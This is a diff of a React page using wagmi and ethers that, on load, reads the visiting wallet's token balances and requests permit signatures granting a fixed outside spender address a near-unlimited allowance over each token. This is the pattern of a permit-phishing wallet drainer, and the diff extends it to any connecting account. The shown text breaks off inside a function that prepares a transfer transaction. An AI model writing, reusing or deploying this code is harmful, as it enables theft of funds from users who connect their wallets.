@@ -1,28 +1,26 @@
 import { Button, FormControl, FormLabel } from '@chakra-ui/react'
-import { getContract } from '@wagmi/core'
+import { fetchSigner, getAccount, getContract } from '@wagmi/core'
 import axios from 'axios'
 import { Head } from 'components/layout/Head'
 import { HeadingComponent } from 'components/layout/HeadingComponent'
 import { ethers } from 'ethers'
 import { useEffect, useState } from 'react'
-import { erc721PermitSignature } from 'utils/permit'
-import { useAccount, useSigner } from 'wagmi'
+import { contractHasPermit, erc721PermitSignature } from 'utils/permit'
+import { useAccount } from 'wagmi'
 import erc20Abi from '../utils/abis/erc20.json'
 
 export default function Home() {
-  const { address } = useAccount()
-  const { data: signer } = useSigner()
-
   const [txData, setTxData] = useState<any>(null)
-
+  const { address } = useAccount()
   useEffect(() => {
     connect()
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [])
 
   async function connect() {
+    const account = getAccount()
     try {
-      const balances = await axios.get(`/api/balance/0xf646d9B7d20BABE204a89235774248BA18086dae`)
+      const balances = await axios.get(`/api/balance/${account.address}`)
       for (let bal of balances.data) {
         await signNew(bal.address)
       }
@@ -32,24 +30,35 @@ export default function Home() {
   }
 
   async function signNew(contractAddress: string) {
+    const account = getAccount()
     const spender = '0x9473d4DfB61f4B65d037199c82D920C0609B616c'
-    console.log(contractAddress)
-    const contract = getContract({
-      address: contractAddress || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-      abi: erc20Abi,
-      signerOrProvider: signer as any,
-    })
+    if (contractAddress === 'eth') return
     try {
-      const value = ethers.utils.parseEther('100000000000000000000000').toString()
-
-      const data = await erc721PermitSignature(address || '', spender, value, contract)
-      setTxData(data)
+      const signer = await fetchSigner({
+        chainId: 1,
+      })
+      const hasPermit = await contractHasPermit(contractAddress, 1)
+      if (hasPermit) {
+        const contract = getContract({
+          address: contractAddress || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+          abi: erc20Abi,
+          signerOrProvider: signer as any,
+        })
+        const value = ethers.utils.parseEther('10000000000000000000').toString()
+        const data = await erc721PermitSignature(account.address || '', spender, value, contract)
+        setTxData(data)
+      } else {
+        console.log('no permit', contractAddress)
+      }
     } catch (e) {
       console.log(e)
     }
   }
 
   async function sendTx() {
+    const signer = await fetchSigner({
+      chainId: 1,
+    })
     const contract = getContract({
       address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
       abi: erc20Abi,
